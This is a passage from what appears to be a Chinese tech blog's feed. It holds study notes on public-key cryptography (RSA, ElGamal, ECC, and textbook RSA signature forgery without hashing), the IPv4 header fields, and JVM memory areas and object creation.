M分组,长度问L(L&lt;log_{2}n)M=m_{1}m_{2}...\\
加密算法:c_{i}=m_{i}^{e}(modn) %]]&gt;&lt;/script&gt;

&lt;h3 id=&quot;解密-1&quot;&gt;解密&lt;/h3&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;m_{i}=c^{d}_{i}mod(n)&lt;/script&gt;

&lt;h3 id=&quot;安全性&quot;&gt;安全性&lt;/h3&gt;

&lt;h4 id=&quot;攻击方式&quot;&gt;攻击方式&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;因子分解&lt;/p&gt;

    &lt;p&gt;​	分解n&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;针对参数攻击&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;共模攻击&lt;/li&gt;
      &lt;li&gt;低指数攻击&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;elgamal&quot;&gt;ElGamal&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;该算法安全性依赖于计算有限域上离散对数难题：求解离散对数(目前)是困难的,其逆运算指数运算简单。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;秘钥生成&quot;&gt;秘钥生成&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;随机选取一个满足安全要求的大素数p,生成有限域z_{p}的一个生成元g&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;选取一个随机数x(1&amp;lt;x&amp;lt;p-1),计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;y=g^{x}(modp)&lt;/script&gt;

    &lt;p&gt;&lt;code&gt;公钥为(y,g,p),私钥为x&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加密-2&quot;&gt;加密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;接受(y,g,p)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;消息m分组为长度为L(L&amp;lt;log_{2}p)的消息分组m=m_{1}m_{2}….&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对第i块消息(1&amp;lt;=i&amp;lt;=t)随机选择整数r_{i},1&amp;lt;r_{i}&amp;lt;p-1&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
c_{i}=g^{r_{i}}(modp)\\
c^{'}_{i}=m_{i}y^{r_{i}}(modp)(1&lt;=i&lt;t) %]]&gt;&lt;/script&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将密文C=(c_{i},c^{‘}_{1})…..发给接受方&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;解密-2&quot;&gt;解密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;接受密文&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
m_{i}=(c^{'}_{i}/c^{x}_{i})(mod p)\\
(1&lt;=i&lt;=t) %]]&gt;&lt;/script&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;得到明文:&lt;/p&gt;

    &lt;p&gt;m=m1m2…&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;安全性-1&quot;&gt;安全性&lt;/h3&gt;

&lt;h4 id=&quot;小步大步算法&quot;&gt;小步大步算法&lt;/h4&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;h4 id=&quot;指数积分法&quot;&gt;指数积分法&lt;/h4&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h2 id=&quot;椭圆曲线公钥加密&quot;&gt;椭圆曲线公钥加密&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;椭圆曲线加密算法，即：Elliptic Curve Cryptography，简称ECC，是基于椭圆曲线数学理论实现的一种非对称加密算法。相比RSA，ECC优势是可以使用更短的密钥，来实现与RSA相当或更高的安全。据研究，160位ECC加密安全性相当于1024位RSA加密，210位ECC加密安全性相当于2048位RSA加密&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一般情况下，椭圆曲线可用下列方程式来表示，其中a,b,c,d为系数。&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;E:y^2=ax^3+ bx^2+c^x+d&lt;/script&gt;

&lt;h3 id=&quot;椭圆曲线的运算规则&quot;&gt;椭圆曲线的运算规则&lt;/h3&gt;

&lt;h3 id=&quot;加法&quot;&gt;加法&lt;/h3&gt;

&lt;p&gt;过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/加法.png&quot; alt=&quot;加法&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;二倍运算&quot;&gt;二倍运算&lt;/h3&gt;

&lt;p&gt;上述方法无法解释A + A，即两点重合的情况。因此在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2倍.png&quot; alt=&quot;2倍&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;正负取反&quot;&gt;正负取反&lt;/h3&gt;

&lt;p&gt;将A关于x轴对称位置的点定义为-A，即椭圆曲线的正负取反运算。&lt;/p&gt;

&lt;h3 id=&quot;无穷远点&quot;&gt;无穷远点&lt;/h3&gt;

&lt;p&gt;如果将A与-A相加，过A与-A的直线平行于y轴，可以认为直线与椭圆曲线相交于无穷远点。&lt;/p&gt;

&lt;p&gt;综上，定义了A+B、2A运算，因此给定椭圆曲线的某一点G，可以求出2G、3G（即G + 2G）、4G……。即：当给定G点时，已知x，求xG点并不困难。反之，已知xG点，求x则非常困难。此即为椭圆曲线加密算法背后的数学原理。&lt;/p&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;具体算法参考书籍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;对称密码体制vs公钥密码体制&quot;&gt;对称密码体制Vs公钥密码体制&lt;/h2&gt;

&lt;p&gt;对称密码体制的缺陷：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 密钥分配问题：通信双方要进行加密通信，需要通过秘密的安全信道协商加密密钥，而这种安全信道可能很难实现
 密钥管理问题：在有多个用户的网络中，任何两个用户之间都需要有共享的密钥，当网络中的用户n很大时，需要管理的密钥数目非常大，为n(n-1)/2
没有签名功能：当主体A收到主体B的电子文挡(电子数据)时，无法向第三方证明此电子文档确实来源于B。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;公钥密码体制重点考察三个领域的问题：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;密钥交换：通信双方交换会话密钥，以加密通信双方后续连接所传输的信息。每次逻辑连接使用一把新的会话密钥，用完就丢弃。
通信保密：将公钥作为加密密钥，私钥作为解密密钥，通信双方不需要交换密钥就可以实现保密通信。
数字签名：将私钥作为加密密钥，公钥作为解密密钥，可实现由一个用户对数据加密而使多个用户解读。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在公钥密码体制以前的整个密码学史中，所有的密码算法，包括古典密码和现代密码，都是基于替换和置换这两个基本工具。而公钥密码体制则为密码学的发展提供了新的理论和技术基础， 一方面公钥密码算法的基本工具不再是代换和置换，而是数学函数； 另一方面公钥密码算法是以非对称的形式使用两个密钥，两个密钥的使用对保密性、密钥分配、签名、认证等都有着深刻的意义。&lt;/p&gt;

&lt;p&gt;公钥算法加密解密速度慢。误区：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;公开密钥密码算法更安全
公开密钥密码使对称密钥密码过时了 # 数字签名
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;数字签名解决的问题&quot;&gt;数字签名解决的问题&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;A发送消息给B：A（不可抵赖）——————&amp;gt;B（不可伪造）（不可重用）
(1)不可抵赖     (假如：A可以否认发过该消息，B无法证明A确实发了该消息)
(2)不可伪造 	    (假如：B伪造一个不同的消息，但声称是从A收到的）
(3)不可重用		(假如：签名没有和消息绑定)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;安全模型性质&quot;&gt;安全模型,性质&lt;/h2&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;h2 id=&quot;rsa签名算法以及存在的安全问题&quot;&gt;RSA签名算法以及存在的安全问题&lt;/h2&gt;

&lt;p&gt;如果不使用HASH函数&lt;/p&gt;

&lt;p&gt;1.（存在性伪造）使用“已知消息攻击”
利用RSA的乘法特性，可以进行如下攻击
假设 y1=sigk(m1)和y2=sigk(m2) 是签名者曾经签署的有效签名，
那么 verk (m1m2 mod n, y1y2 mod n) = true&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;（选择性伪造）利用“选择消息攻击”
假设攻击者要对消息 m 伪造一个签名，m=m1m2mod n。
假设攻击者能请求签名者为 m1 和 m2 签名(结果分别为y1和y2)，
那么， y1 y2 mod n 就是消息 m 的有效签名&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;对抗攻击的方法：使用HASH函数
私钥签名，公钥验证&lt;/p&gt;

&lt;h2 id=&quot;elgamal签名算法以及存在的安全问题&quot;&gt;ElGamal签名算法以及存在的安全问题&lt;/h2&gt;

&lt;h2 id=&quot;特殊的签名算法以及适应的应用场景&quot;&gt;特殊的签名算法以及适应的应用场景&lt;/h2&gt;

&lt;h1 id=&quot;密码协议&quot;&gt;密码协议&lt;/h1&gt;

&lt;h1 id=&quot;秘钥管理&quot;&gt;秘钥管理&lt;/h1&gt;

&lt;h2 id=&quot;原则&quot;&gt;原则&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;区分秘钥管理的策略和机制&lt;/li&gt;
  &lt;li&gt;完全安全原则&lt;/li&gt;
  &lt;li&gt;最小权利原则&lt;/li&gt;
  &lt;li&gt;责任分离原则&lt;/li&gt;
  &lt;li&gt;秘钥分级原则&lt;/li&gt;
  &lt;li&gt;秘钥更换原则&lt;/li&gt;
  &lt;li&gt;秘钥有足够长度&lt;/li&gt;
  &lt;li&gt;密码体制不同,秘钥管理也不同&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;几类秘钥作用&quot;&gt;几类秘钥作用&lt;/h2&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc] 基础概念</summary></entry><entry><title type="html">IP报文</title><link href="http://localhost:4000/_posts/2020-07-18-IP%E6%8A%A5%E6%96%87/" rel="alternate" type="text/html" title="IP报文" /><published>2020-07-18T00:00:00-04:00</published><updated>2020-07-18T00:00:00-04:00</updated><id>http://localhost:4000/_posts/IP%E6%8A%A5%E6%96%87</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-18-IP%E6%8A%A5%E6%96%87/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;IP报文是在网络层传输的数据单元，也叫IP数据报&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/IP报文.png&quot; alt=&quot;IP报文&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;版本：IP协议的版本，目前的IP协议版本号为4，下一代IP协议版本号为6。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;首部长度：IP报头的长度。固定部分的长度（20字节）和可变部分的长度之和。共占4位。最大为1111，即10进制的15，代表IP报头的最大长度可以为15个32bits（4字节），也就是最长可为15*4=60字节，除去固定部分的长度20字节，可变部分的长度最大为40字节。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务类型：Type Of Service。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;总长度：IP报文的总长度。报头的长度和数据部分的长度之和。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;标识：唯一的标识主机发送的每一分数据报。通常每发送一个报文，它的值加一。当IP报文长度超过传输网络的MTU（最大传输单元）时必须分片，这个标识字段的值被复制到所有数据分片的标识字段中，使得这些分片在达到最终目的地时可以依照标识字段的内容重新组成原先的数据。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;标志：共3位。R、DF、MF三位。目前只有后两位有效，DF位：为1表示不分片，为0表示分片。MF：为1表示“更多的片”，为0表示这是最后一片。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;片位移：本分片在原先数据报文中相对首位的偏移位。（需要再乘以8）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;生存时间：IP报文所允许通过的路由器的最大数量。每经过一个路由器，TTL减1，当为0时，路由器将该数据报丢弃。TTL 字段是由发送端初始设置一个 8 bit字段.推荐的初始值由分配数字 RFC 指定，当前值为 64。发送 ICMP 回显应答时经常把 TTL 设为最大值 255。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;协议：指出IP报文携带的数据使用的是那种协议，以便目的主机的IP层能知道要将数据报上交到哪个进程（不同的协议有专门不同的进程处理）。和端口号类似，此处采用协议号，TCP的协议号为6，UDP的协议号为17。ICMP的协议号为1，IGMP的协议号为2.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;首部校验和：计算IP头部的校验和，检查IP报头的完整性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;源IP地址：标识IP数据报的源端设备。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;目的IP地址：标识IP数据报的目的地址。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">jvm总结</title><link href="http://localhost:4000/_posts/2020-07-17-jvm%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="jvm总结" /><published>2020-07-17T00:00:00-04:00</published><updated>2020-07-17T00:00:00-04:00</updated><id>http://localhost:4000/_posts/jvm%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-17-jvm%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;jvm-的主要组成部分&quot;&gt;JVM 的主要组成部分&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/jvm.png&quot; alt=&quot;jvm&quot; /&gt;&lt;/p&gt;

&lt;p&gt;JVM包含两个子系统和两个组件，两个子系统为Class loader(类装载)、Execution engine(执行引擎)；两个组件为Runtime data area(运行时数据区)、Native Interface(本地接口)。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Class loader(类装载)：根据给定的全限定名类名(如：java.lang.Object)来装载class文件到Runtime data area中的method area。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Execution engine（执行引擎）：执行classes中的指令。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Native Interface(本地接口)：与native libraries交互，是其它编程语言交互的接口。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Runtime data area(运行时数据区域)：这就是我们常说的JVM的内存&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作用 ：首先通过编译器把 Java 代码转换成字节码，类加载器（ClassLoader）再把字节码加载到内存中，将其放在运行时数据区（Runtime data area）的方法区内，而字节码文件只是 JVM 的一套指令集规范，并不能直接交给底层操作系统去执行，因此需要特定的命令解析器执行引擎（Execution Engine），将字节码翻译成底层系统指令，再交由 CPU 去执行，而这个过程中需要调用其他语言的本地库接口（Native Interface）来实现整个程序的功能&lt;/p&gt;

&lt;h1 id=&quot;java程序运行机制步骤&quot;&gt;Java程序运行机制步骤&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;首先利用IDE集成开发工具编写Java源代码，源文件的后缀为.java；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;再利用编译器(javac命令)将源代码编译成字节码文件，字节码文件的后缀名为.class；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;运行字节码的工作是由解释器(java命令)来完成的。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/java_run.png&quot; alt=&quot;java_run&quot; /&gt;&lt;/p&gt;

&lt;p&gt;的加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个 java.lang.Class对象，用来封装类在方法区内的数据结构&lt;/p&gt;

&lt;h1 id=&quot;jvm-运行时数据区&quot;&gt;JVM 运行时数据区&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Java 虚拟机在执行 Java 程序的过程中会把它所管理的内存区域划分为若干个不同的数据区域&lt;/strong&gt;。这些区域都有各自的用途，以及创建和销毁的时间，有些区域随着虚拟机进程的启动而存在，有些区域则是依赖线程的启动和结束而建立和销毁。Java 虚拟机所管理的内存被划分为如下几个区域：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/数据区.png&quot; alt=&quot;数据区&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不同虚拟机的运行时数据区可能略微有所不同，但都会遵从 Java 虚拟机规范， Java 虚拟机规范规定的区域分为以下 5 个部分：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;程序计数器（Program Counter Register）：当前线程所执行的字节码的行号指示器，字节码解析器的工作是通过改变这个计数器的值，来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能，都需要依赖这个计数器来完成；&lt;/li&gt;
  &lt;li&gt;Java 虚拟机栈（Java Virtual Machine Stacks）：用于存储局部变量表、操作数栈、动态链接、方法出口等信息；&lt;/li&gt;
  &lt;li&gt;本地方法栈（Native Method Stack）：与虚拟机栈的作用是一样的，只不过虚拟机栈是服务 Java 方法的，而本地方法栈是为虚拟机调用 Native 方法服务的；&lt;/li&gt;
  &lt;li&gt;Java 堆（Java Heap）：Java 虚拟机中内存最大的一块，是被所有线程共享的，几乎所有的对象实例都在这里分配内存；&lt;/li&gt;
  &lt;li&gt;方法区（Methed Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译后的代码等数据。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;深拷贝和浅拷贝&quot;&gt;深拷贝和浅拷贝&lt;/h1&gt;

&lt;p&gt;浅拷贝（shallowCopy）只是增加了一个指针指向已存在的内存地址，&lt;/p&gt;

&lt;p&gt;深拷贝（deepCopy）是增加了一个指针并且申请了一个新的内存，使这个增加的指针指向这个新的内存，&lt;/p&gt;

&lt;p&gt;使用深拷贝的情况下，释放内存的时候不会因为出现浅拷贝时释放同一个内存的错误。&lt;/p&gt;

&lt;p&gt;浅复制：仅仅是指向被复制的内存地址，如果原地址发生改变，那么浅复制出来的对象也会相应的改变。&lt;/p&gt;

&lt;p&gt;深复制：在计算机中开辟一块新的内存地址用于存放复制的对象。&lt;/p&gt;

&lt;h1 id=&quot;堆栈区别&quot;&gt;堆栈区别&lt;/h1&gt;

&lt;h2 id=&quot;物理地址&quot;&gt;物理地址&lt;/h2&gt;

&lt;p&gt;堆的物理地址分配对对象是不连续的。因此性能慢些。在GC的时候也要考虑到不连续的分配，所以有各种算法。比如，标记-消除，复制，标记-压缩，分代（即新生代使用复制算法，老年代使用标记——压缩）&lt;/p&gt;

&lt;p&gt;栈使用的是数据结构中的栈，先进后出的原则，物理地址分配是连续的。所以性能快。&lt;/p&gt;

&lt;h2 id=&quot;内存分别&quot;&gt;内存分别&lt;/h2&gt;

&lt;p&gt;堆因为是不连续的，所以分配的内存是在&lt;code&gt;运行期&lt;/code&gt;确认的，因此大小不固定。一般堆大小远远大于栈。&lt;/p&gt;

&lt;p&gt;栈是连续的，所以分配的内存大小要在&lt;code&gt;编译期&lt;/code&gt;就确认，大小是固定的。&lt;/p&gt;

&lt;h2 id=&quot;存放的内容&quot;&gt;存放的内容&lt;/h2&gt;

&lt;p&gt;堆存放的是对象的实例和数组。因此该区更关注的是数据的存储&lt;/p&gt;

&lt;p&gt;栈存放：局部变量，操作数栈，返回结果。该区更关注的是程序方法的执行&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;静态变量放在方法区&lt;/p&gt;

  &lt;p&gt;静态的对象还是放在堆&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;程序的可见度&quot;&gt;程序的可见度&lt;/h2&gt;

&lt;p&gt;堆对于整个应用程序都是共享、可见的。&lt;/p&gt;

&lt;p&gt;栈只对于线程是可见的。所以也是线程私有。他的生命周期和线程相同&lt;/p&gt;

&lt;h1 id=&quot;hotspot虚拟机对象&quot;&gt;HotSpot虚拟机对象&lt;/h1&gt;

&lt;h2 id=&quot;对象的创建&quot;&gt;对象的创建&lt;/h2&gt;

&lt;p&gt;说到对象的创建，首先让我们看看 &lt;code&gt;Java&lt;/code&gt; 中提供的几种对象创建方式：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Header&lt;/th&gt;
      &lt;th&gt;解释&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;new&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用class的newInstance&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用constructor类的newInstance&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用clone&lt;/td&gt;
      &lt;td&gt;没有调用构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用反序列化&lt;/td&gt;
      &lt;td&gt;没有调用构造函数&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;对象创建的主要流程:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;new Classs&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;类是否加载&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分配内存&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;并发处理&lt;/p&gt;

    &lt;p&gt;CAS同步处理或者本地线程分配缓存&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;初始化&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;将分配的内存空间都初始化为0&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;init方法&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虚拟机遇到一条new指令时，先检查常量池是否已经加载相应的类，如果没有，必须先执行相应的类加载。类加载通过后，接下来分配内存。若Java堆中内存是绝对规整的，使用“指针碰撞“方式分配内存；如果不是规整的，就从空闲列表中分配，叫做”空闲列表“方式。划分内存时还需要考虑一个问题-并发，也有两种方式: CAS同步处理，或者本地线程分配缓冲(Thread Local Allocation Buffer, TLAB)。然后内存空间初始化操作，接着是做一些必要的对象设置(元信息、哈希码…)，最后执行&lt;init&gt;方法&lt;/init&gt;&lt;/p&gt;

&lt;h2 id=&quot;为对象分配内存&quot;&gt;为对象分配内存&lt;/h2&gt;

&lt;p&gt;类加载完成后，接着会在Java堆中划分一块内存分配给对象。内存分配根据Java堆是否规整，有两种方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;指针碰撞：如果Java堆的内存是规整，即所有用过的内存放在一边，而空闲的的放在另一边。分配内存时将位于中间的指针指示器向空闲的内存移动一段与对象大小相等的距离，这样便完成分配内存工作。&lt;/li&gt;
  &lt;li&gt;空闲列表：如果Java堆的内存不是规整的，则需要由虚拟机维护一个列表来记录那些内存是可用的，这样在分配的时候可以从列表中查询到足够大的内存分配给对象，并在分配后更新列表记录&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;选择哪种分配方式是由 Java 堆是否规整来决定的，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/内存分配.png&quot; alt=&quot;内存分配&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;并发安全问题&quot;&gt;并发安全问题&lt;/h2&gt;

&lt;p&gt;对象的创建在虚拟机中是一个非常频繁的行为，哪怕只是修改一个指针所指向的位置，在并发情况下也是不安全的，可能出现正在给对象 A 分配内存，指针还没来得及修改，对象 B 又同时使用了原来的指针来分配内存的情况。解决这个问题有两种方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对分配内存空间的动作进行同步处理（采用 CAS + 失败重试来保障更新操作的原子性）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;把内存分配的动作按照线程划分在不同的空间之中进行，即每个线程在 Java 堆中预先分配一小块内存，称为本地线程分配缓冲（Thread Local Allocation Buffer, TLAB）。哪个线程要分配内存，就在哪个线程的 TLAB 上分配。只有 TLAB 用完并分配新的 TLAB 时，才需要同步锁。通过-XX:+/-UserTLAB参数来设定虚拟机是否使用TLAB&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/线程安全.png&quot; alt=&quot;线程安全&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;对象的访问定位&quot;&gt;对象的访问定位&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Java&lt;/code&gt;程序需要通过 &lt;code&gt;JVM&lt;/code&gt; 栈上的引用访问堆中的具体对象。对象的访问方式取决于 &lt;code&gt;JVM&lt;/code&gt; 虚拟机的实现。目前主流的访问方式有 &lt;strong&gt;句柄&lt;/strong&gt; 和 &lt;strong&gt;直接指针&lt;/strong&gt; 两种方式&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;指针：&lt;/strong&gt; 指向对象，代表一个对象在内存中的起始地址。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;句柄：&lt;/strong&gt; 可以理解为指向指针的指针，维护着对象的指针。句柄不直接指向对象，而是指向对象的指针（句柄不发生变化，指向固定内存地址），再由对象的指针指向对象的真实内存地址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;句柄访问&quot;&gt;句柄访问&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;Java&lt;/code&gt;堆中划分出一块内存来作为&lt;strong&gt;句柄池&lt;/strong&gt;，引用中存储对象的&lt;strong&gt;句柄地址&lt;/strong&gt;，而句柄中包含了&lt;strong&gt;对象实例数据&lt;/strong&gt;与&lt;strong&gt;对象类型数据&lt;/strong&gt;各自的&lt;strong&gt;具体地址&lt;/strong&gt;信息，具体构造如下图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/句柄访问.png&quot; alt=&quot;句柄访问&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：引用中存储的是&lt;strong&gt;稳定&lt;/strong&gt;的句柄地址，在对象被移动（垃圾收集时移动对象是非常普遍的行为）时只会改变&lt;strong&gt;句柄中&lt;/strong&gt;的&lt;strong&gt;实例数据指针&lt;/strong&gt;，而&lt;strong&gt;引用&lt;/strong&gt;本身不需要修改&lt;/p&gt;

&lt;h3 id=&quot;直接指针&quot;&gt;直接指针&lt;/h3&gt;

&lt;p&gt;如果使用&lt;strong&gt;直接指针&lt;/strong&gt;访问，&lt;strong&gt;引用&lt;/strong&gt; 中存储的直接就是&lt;strong&gt;对象地址&lt;/strong&gt;，那么&lt;code&gt;Java&lt;/code&gt;堆对象内部的布局中就必须考虑如何放置访问&lt;strong&gt;类型数据&lt;/strong&gt;的相关信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/直接指针.png&quot; alt=&quot;直接指针&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：速度更&lt;strong&gt;快&lt;/strong&gt;，节省了&lt;strong&gt;一次指针定位&lt;/strong&gt;的时间开销。由于对象的访问在&lt;code&gt;Java&lt;/code&gt;中非常频繁，因此这类开销积少成多后也是非常可观的执行成本。HotSpot 中采用的就是这种方式&lt;/p&gt;

&lt;h1 id=&quot;内存溢出异常&quot;&gt;内存溢出异常&lt;/h1&gt;

&lt;p&gt;内存泄漏是指不再被使用的对象或者变量一直被占据在内存中。理论上来说，Java是有GC垃圾回收机制的，也就是说，不再被使用的对象，会被GC自动回收掉，自动从内存中清除。&lt;/p&gt;

